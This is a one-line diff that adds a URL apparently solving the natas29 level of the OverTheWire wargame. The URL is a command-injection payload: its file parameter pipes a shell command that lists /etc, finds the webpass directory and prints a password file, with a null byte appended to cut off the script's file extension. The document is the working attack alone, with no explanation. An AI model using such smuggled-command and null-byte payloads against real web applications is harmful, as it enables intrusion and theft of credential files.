@@ -1,0 +1,1 @@
+http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/$(ls%20/etc%20|%20grep%20webpass)/*30%00
